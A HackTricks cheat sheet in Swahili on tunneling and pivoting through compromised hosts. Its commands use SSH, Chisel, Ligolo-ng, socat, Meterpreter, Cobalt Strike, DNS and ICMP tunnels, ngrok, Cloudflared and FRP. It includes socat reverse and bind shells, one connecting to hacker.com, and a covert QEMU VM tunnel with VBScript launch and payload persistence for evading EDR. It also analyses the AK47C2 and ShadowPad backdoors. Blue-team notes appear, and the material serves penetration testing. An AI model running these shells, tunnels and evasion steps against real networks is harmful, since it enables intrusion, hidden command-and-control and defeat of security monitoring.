# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Ushauri wa Nmap

> [!WARNING]
> **ICMP** na **SYN** scans haziwezi kupitishwa kupitia socks proxies, kwa hivyo lazima **tuzima ping discovery** (`-Pn`) na kubainisha **TCP scans** (`-sT`) ili hili lifanye kazi.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Muunganisho wa picha wa SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Fungua port mpya kwenye SSH Server --> Port nyingine
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Port ya ndani --> Host iliyoathiriwa (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Port ya ndani --> Host iliyoathirika (SSH) --> Popote pale
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Hii ni muhimu kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi kwenye host yako:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Unahitaji **root kwenye vifaa vyote viwili** (kwa kuwa utaunda interfaces mpya), na usanidi wa sshd lazima uruhusu kuingia kama root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Washa forwarding upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka route mpya upande wa client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> Mashambulizi ya downgrade ya Terrapin ya mwaka 2023 yanaweza kumruhusu man-in-the-middle kuchezea SSH handshake ya awali na kuingiza data kwenye **channel yoyote iliyoforwardiwa** ( `-L`, `-R`, `-D` ). Hakikisha client na server zote zimefanyiwa patch (**OpenSSH ≥ 9.6/LibreSSH 6.7**) au uzime wazi algorithms zilizo hatarini `chacha20-poly1305@openssh.com` na `*-etm@openssh.com` kwenye `sshd_config`/`ssh_config` kabla ya kutegemea SSH tunnels.

## SSHUTTLE

Unaweza **kutunnel** kupitia **ssh** **traffic** yote ya **subnetwork** kupitia host.\
Kwa mfano, kuforward traffic yote inayoelekea 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Unganisha kwa kutumia private key
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Local port --> host iliyoathiriwa (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Fungua porti kwenye teamserver inayosikiliza kwenye interfaces zote, ambayo inaweza kutumika **kupeleka traffic kupitia beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Katika hali hii, **port inafunguliwa kwenye beacon host**, si kwenye Team Server, na traffic inatumwa kwa Team Server kisha kutoka hapo kwenda kwenye host:port iliyoonyeshwa.
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Kumbuka:

- Beacon's reverse port forward imeundwa **kutunnel traffic kwenda kwenye Team Server, si kwa ajili ya kurelay traffic kati ya mashine binafsi**.
- Traffic **inatunnel ndani ya Beacon's C2 traffic**, ikijumuisha P2P links.
- **Admin privileges hazihitajiki** kuunda reverse port forwards kwenye high ports.

### rPort2Port local

> [!WARNING]
> Katika hali hii, **port inafunguliwa kwenye beacon host**, si kwenye Team Server, na **traffic inatumwa kwenye Cobalt Strike client** (si kwenye Team Server), kisha kutoka hapo inatumwa kwenye host:port iliyoonyeshwa.
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Unahitaji kupakia web file tunnel: ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Unahitaji kutumia **toleo lilelile kwa client na server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Tumia toleo lilelile kwa agent na proxy**

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Binding na Listening ya Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Kufikia Port za Ndani za Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. Tunnel inaanzishwa kutoka kwa victim.\
Proxy ya socks4 inaundwa kwenye 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kupita **proxy isiyohitaji uthibitishaji** kwa kutekeleza mstari huu badala ya wa mwisho kwenye console ya mwathiriwa:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Unda certificates kwenye pande zote mbili: Client na Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Unganisha port ya SSH ya ndani (22) na port 443 ya attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Ni kama toleo la console la PuTTY (chaguo zake zinafanana sana na za ssh client).

Kwa kuwa binary hii itatekelezwa kwenye mwathiriwa na ni ssh client, tunahitaji kufungua huduma na port yetu ya ssh ili tuweze kupata reverse connection. Kisha, ku-forward port inayoweza kufikiwa locally pekee kwenda kwenye port kwenye machine yetu:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Unahitaji kuwa local admin (kwa port yoyote)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **RDP access kwenye system**.\
Pakua:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kutunnel packets kupitia connection ya RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye kompyuta yako ya client, pakia **`SocksOverRDP-Plugin.dll`** kama ifuatavyo:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** kwenye **victim** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **ujumbe** unaosema kwamba **SocksOverRDP plugin** imewezeshwa, na itaanza **kusikiliza** kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP**, kisha upakie na utekeleze kwenye mashine ya victim binary ya `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 inasikiliza:
```
netstat -antb | findstr 1080
```
Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) **kupitisha traffic kupitia port hiyo.**

## Proxify Windows GUI Apps

Unaweza kufanya Windows GUI apps zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).\
Katika **Profile -> Proxy Servers**, ongeza IP na port ya SOCKS server.\
Katika **Profile -> Proxification Rules**, ongeza jina la program itakayotumia proxy na connections kwenye IP unazotaka zipitie proxy.

## NTLM proxy bypass

Tool iliyotajwa awali: **Rpivot**\
**OpenVPN** pia inaweza kuibypass, kwa kuweka options hizi kwenye configuration file:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Inafanya authentication dhidi ya proxy na kufunga port locally ambayo inapeleka traffic kwenye external service unayoainisha. Kisha, unaweza kutumia tool unayoichagua kupitia port hii.\
Kwa mfano, ku-forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, ikiwa kwa mfano utaweka huduma ya **SSH** kwenye victim isikilize porti 443, unaweza kuunganisha nayo kupitia porti 2222 ya attacker.\
Unaweza pia kutumia **meterpreter** inayounganisha kwenye localhost:443, huku attacker akisubiri kwenye porti 2222.

## YARP

Reverse proxy iliyoundwa na Microsoft. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root inahitajika kwenye mifumo yote miwili ili kuunda tun adapters na kutunnel data kati yao kwa kutumia DNS queries.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Tunnel itakuwa ya polepole sana. Unaweza kuunda muunganisho wa SSH uliobanwa kupitia tunnel hii kwa kutumia:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pakua kutoka hapa**](https://github.com/iagox86/dnscat2)**.**

Huanzisha channel ya C&C kupitia DNS. Haihitaji privileges za root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 kwenye PowerShell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding kwa dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Badilisha DNS ya proxychains

Proxychains inakatiza `gethostbyname` libc call na ku-tunnel ombi la tcp DNS kupitia socks proxy. Kwa **default**, server ya **DNS** inayotumiwa na proxychains ni **4.2.2.2** (hardcoded). Ili kuibadilisha, edit file: _/usr/lib/proxychains3/proxyresolv_ na ubadilishe IP. Ikiwa uko katika **Windows environment**, unaweza kuweka IP ya **domain controller**.

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor aliunda **dual-channel C2 ("AK47C2")** inayotumia vibaya *only* traffic ya **DNS** ya kutoka nje na **plain HTTP POST** – protocols mbili ambazo mara chache huzuiwa kwenye corporate networks.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Hutengeneza SessionID ya random yenye characters 5 (mfano `H4T14`).
• Huongeza `1` kwa *task requests* au `2` kwa *results*, kisha huunganisha fields tofauti (flags, SessionID, computer name).
• Kila field huwa **XOR-encrypted kwa ASCII key `VHBD@H`**, hu-encode kwa hex, na huunganishwa kwa dots – mwishowe huishia kwenye attacker-controlled domain:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests hutumia `DnsQuery()` kwa records za **TXT** (na fallback **MG**).
• Response inapozidi bytes 0xFF, backdoor hugawanya data katika vipande vya bytes 63 na huingiza markers:
`s<SessionID>t<TOTAL>p<POS>` ili C2 server iweze kuvipanga upya.

2. **HTTP mode (AK47HTTP)**
• Huunda JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob yote huwa XOR-`VHBD@H` → hex → hutumwa kama body ya **`POST /`** yenye header `Content-Type: text/plain`.
• Reply hufuata encoding hiyo hiyo na field ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.

Notes za Blue Team
• Tafuta **TXT queries** zisizo za kawaida ambazo label yao ya kwanza ni hexadecimal ndefu na huishia kila mara kwenye domain moja adimu.
• XOR key ya kudumu inayofuatwa na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).
• Kwa HTTP, flag text/plain POST bodies ambazo ni hex tupu na zina multiple ya bytes mbili.

{{#note}}
Channel yote inatoshea ndani ya **standard RFC-compliant queries** na huweka kila sub-domain label chini ya bytes 63, hivyo huwa stealthy katika DNS logs nyingi.
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root inahitajika katika systems zote mbili ili kuunda tun adapters na ku-tunnel data kati yao kwa kutumia ICMP echo requests.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pakua kutoka hapa**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **ni tool ya kuweka solutions wazi kwenye Internet kwa command line moja.**\
_URI za ufichuaji ni kama:_ **UID.ngrok.io**

### Usakinishaji

- Fungua account: https://ngrok.com/signup
- Upakuaji wa Client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi ya msingi

**Hati:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Inawezekana pia kuongeza authentication na TLS, ikiwa ni lazima._

#### Tunneling ya TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kufichua faili kwa HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing miito ya HTTP

_Useful for XSS,SSRF,SSTI ..._\
Moja kwa moja kutoka stdout au katika interface ya HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling huduma ya HTTP ya ndani
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Mfano rahisi wa usanidi wa ngrok.yaml

Inafungua tunnels 3:

- TCP 2
- HTTP 1 yenye uwasilishaji wa static files kutoka /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Daemon ya Cloudflare `cloudflared` inaweza kuunda tunnels za outbound zinazowezesha **local TCP/UDP services** kufikiwa bila kuhitaji inbound firewall rules, kwa kutumia edge ya Cloudflare kama rendez-vous point. Hii ni muhimu sana wakati egress firewall inaruhusu HTTPS traffic pekee lakini inbound connections zimezuiwa.

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Tunnels zinazoendelea kwa DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Anzisha connector:
```bash
cloudflared tunnel run mytunnel
```
Kwa kuwa traffic yote huondoka kwenye host **outbound kupitia 443**, Cloudflared tunnels ni njia rahisi ya kupita ingress ACLs au mipaka ya NAT. Kumbuka kuwa binary kwa kawaida huendeshwa ikiwa na privileges za juu – tumia containers au flag ya `--user` inapowezekana.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) ni reverse-proxy ya Go inayodumishwa kikamilifu na inayotumia **TCP, UDP, HTTP/S, SOCKS na P2P NAT-hole-punching**. Kuanzia **v0.53.0 (Mei 2024)** inaweza kufanya kazi kama **SSH Tunnel Gateway**, hivyo target host inaweza kuanzisha reverse tunnel kwa kutumia stock OpenSSH client pekee – bila kuhitaji binary ya ziada.

### Classic reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Kutumia gateway mpya ya SSH (bila binary ya frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
Amri iliyo hapo juu huchapisha port ya victim **8080** kama **attacker_ip:9000** bila ku-deploy tooling ya ziada – inafaa kwa pivoting ya living-off-the-land.

## Covert VM-based Tunnels with QEMU

QEMU’s user-mode networking (`-netdev user`) inasaidia option inayoitwa `hostfwd` ambayo **hufunga port ya TCP/UDP kwenye *host* na ku-forward kwenda ndani ya *guest***. Guest inapokuwa inaendesha SSH daemon kamili, rule ya hostfwd hukupa SSH jump box ya muda inayokaa kikamilifu ndani ya VM ya ephemeral – inafaa kabisa kuficha traffic ya C2 kutoka kwa EDR kwa sababu shughuli na files zote hasidi hubaki kwenye virtual disk.<sup>[[1]](#references)</sup>

### One-liner ya haraka
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• Amri iliyo hapo juu inaanzisha image ya **Tiny Core Linux** (`tc.qcow2`) kwenye RAM.
• Port **2222/tcp** kwenye Windows host ina-forward kwa uwazi kwenda **22/tcp** ndani ya guest.
• Kwa mtazamo wa mshambuliaji, target inaonyesha port 2222 pekee; packets zozote zinazofika hapo zinashughulikiwa na SSH server inayoendesha ndani ya VM.

### Kuanzisha kwa stealth kupitia VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Kuendesha script kwa `cscript.exe //B update.vbs` kunaendelea kuficha dirisha.

### Persistence ndani ya guest

Kwa sababu Tiny Core haina hali ya kudumu, attackers kwa kawaida:

1. Weka payload kwenye `/opt/123.out`
2. Ongeza kwenye `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Ongeza `home/tc` na `opt` kwenye `/opt/filetool.lst` ili payload ifungashwe kwenye `mydata.tgz` wakati wa kuzima.

### Kwa nini hii hukwepa detection

• Ni executables mbili tu ambazo hazijasainiwa (`qemu-system-*.exe`) zinazogusa disk; hakuna drivers au services zinazosakinishwa.
• Security products kwenye host huona **benign loopback traffic** (C2 halisi hukatisha muunganisho ndani ya VM).
• Memory scanners hazichanganui kamwe process space hasidi kwa sababu iko kwenye OS tofauti.

### Vidokezo kwa Defender

• Toa alert kuhusu **QEMU/VirtualBox/KVM binaries zisizotarajiwa** zilizo kwenye paths zinazoweza kuandikwa na user.
• Zuia outbound connections zinazotoka kwenye `qemu-system*.exe`.
• Tafuta listening ports adimu (2222, 10022, …) zinazobind mara tu baada ya QEMU kuzinduliwa.

## IIS/HTTP.sys relay nodes kupitia `HttpAddUrl` (ShadowPad)

IIS module ya ShadowPad ya Ink Dragon hubadilisha kila perimeter web server iliyoathirika kuwa **backdoor + relay** yenye matumizi mawili kwa kubind URL prefixes zilizofichwa moja kwa moja kwenye layer ya HTTP.sys:<sup>[[3]](#references)</sup>

* **Config defaults** – ikiwa JSON config ya module haijumuishi values, hutumia IIS defaults zinazoaminika (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Kwa njia hiyo, benign traffic hujibiwa na IIS ikiwa na branding sahihi.
* **Wildcard interception** – operators hutoa orodha iliyotenganishwa kwa semicolon ya URL prefixes (wildcards kwenye host + path). Module huita `HttpAddUrl` kwa kila entry, hivyo HTTP.sys hupeleka requests zinazolingana kwa malicious handler *kabla* request haijafikia IIS modules.
* **Encrypted first packet** – bytes mbili za kwanza za request body hubeba seed ya custom 32-bit PRNG. Kila byte inayofuata hu-XOR-iwa na keystream inayozalishwa kabla ya protocol parsing:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Relay orchestration** – module hudumisha lists mbili: “servers” (upstream nodes) na “clients” (downstream implants). Entries huondolewa ikiwa hakuna heartbeat inayofika ndani ya takriban sekunde 30. Lists zote mbili zikiwa si tupu, huunganisha server ya kwanza yenye afya na client ya kwanza yenye afya, kisha hupitisha bytes kati ya sockets zao hadi upande mmoja ufunge muunganisho.
